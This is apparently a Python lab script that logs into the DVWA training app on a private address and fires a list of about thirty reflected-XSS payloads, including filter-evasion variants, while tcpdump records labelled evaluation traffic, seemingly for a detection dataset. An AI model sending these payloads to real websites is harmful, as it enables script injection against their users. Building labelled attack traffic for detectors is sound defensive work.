import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS XSS EVALUACION
# DISTINTOS a los de entrenamiento_xss.py
# =============================================

PAYLOADS_XSS_EVALUACION = [
    "<script>alert('evaluacion')</script>",
    "<script>alert('test_eval')</script>",
    "<img src=z onerror=alert('eval')>",
    "<svg/onload=alert('eval')>",
    "<body/onload=alert('eval')>",
    "<isindex autofocus onfocus=alert(1)>",
    "<form><button formaction=javascript:alert(1)>X",
    "<math href=javascript:alert(1)>click",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    "<svg><animateMotion onbegin=alert(1)>",
    "<video onloadstart=alert(1) src=x>",
    "<script>window.alert(1)</script>",
    "<script>this.alert(1)</script>",
    "<script>globalThis.alert(1)</script>",
    "<script>self.alert(1)</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>({'a':alert}['a'])(1)</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>new Function('alert(1)')()</script>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<script>alert(/eval/)</script>",
    "<script>alert(/xss/.source)</script>",
    "<img src=\"javascript:alert(1)\">",
    "<table><td background=\"javascript:alert(1)\">",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>location='javascript:alert(1)'</script>",
    "<script>window.location='javascript:alert(1)'</script>",
    "<script>document.location='javascript:alert(1)'</script>",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_xss_eval(session):
    print("\n[*] Iniciando ataques XSS (evaluacion)...")
    payloads = PAYLOADS_XSS_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS_EVAL | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: XSS REFLECTED")
    print("  Target: " + BASE_URL)
    print("  Etiqueta real: 'xss'")
    print("")
    print("  !! IMPORTANTE !!")
    print("  NO subir el pcap a Elasticsearch.")
    print("  Guardarlo como: evaluacion_xss.pcap")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_xss_eval(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump y guarda el pcap como:")
    print("  evaluacion_xss.pcap")
    print("="*60)
